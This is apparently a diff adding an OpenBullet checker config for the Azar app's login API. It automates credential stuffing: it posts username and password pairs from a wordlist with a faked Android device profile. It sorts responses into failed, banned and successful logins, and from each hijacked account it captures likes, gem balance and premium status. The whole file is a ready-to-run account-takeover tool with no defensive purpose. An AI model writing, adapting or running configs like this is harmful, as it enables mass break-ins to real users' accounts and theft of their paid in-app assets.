@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Azar APİ",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-26T15:19:07.0399246+03:00",
+  "AdditionalInfo": "",
+  "Author": "Rez88",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Giriş REQUEST POST "https://api.azarlive.com/json/loginWithEmail" 
+  CONTENT "{\"id\":\"-6650666006024121715\",\"jsonrpc\":\"2.0\",\"method\":\"loginWithEmail\",\"params\":[{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"position\":null,\"location\":null,\"localeInfo\":{\"languageCode\":\"en\",\"countryCode\":\"TR\"},\"language\":null,\"deviceId\":\"31c1fb0cded719a82bec2a5c05e1ae59c1c682cabd0ab8f514e0a1a6b48088cb\",\"timeZoneId\":\"Africa/Nairobi\",\"versionCode\":1595,\"userSettings\":null,\"clientProperties\":{\"platform\":\"Android\",\"flavor\":\"playstore\",\"capabilities\":[\"HYPEREFFECTS_V2\"],\"brand\":\"samsung\",\"model\":\"SM-N9005\",\"androidVersion\":\"4.4.2\",\"platformVersion\":\"4.4.2\",\"apiLevel\":19,\"numOfCores\":2,\"simCountryCode\":\"TR\",\"networkCountryCode\":\"TR\",\"networkType\":\"WIFI\",\"carrierName\":\"Turkcell\",\"ramCapacity\":2022,\"screenWidth\":900,\"screenHeight\":1440,\"frontCameraWidth\":null,\"frontCameraHeight\":null,\"backCameraWidth\":null,\"backCameraHeight\":null,\"abis\":[\"x86\",\"armeabi-v7a\"]},\"clientSideUserSettings\":{\"screenshotEnabled\":false},\"background\":false,\"consents\":{},\"country\":null}]}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: okhttp/3.8.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: api.azarlive.com" 
+  HEADER "Content-Length: 981" 
+#Keyler KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "bad_password" 
+    KEY "username_not_found" 
+    KEY "reason\":\"bad_password" 
+  KEYCHAIN Ban OR 
+    KEY "403 Forbidden" 
+  KEYCHAIN Success OR 
+    KEY "result\":{\"userId" 
+    KEY "user_premium" 
+#Beğenilme_Toplamı PARSE "<SOURCE>" LR "coolPoint\":" ",\"" -> CAP "Beğenilme Toplamı" 
+#Değerli_Taşları PARSE "<SOURCE>" LR "GEMS\",\"quantity\":" ",\"" -> CAP "Değerli Taşları" 
+#Premium PARSE "<SOURCE>" LR "user_premium\":\"" "\"," -> CAP "Premium" 
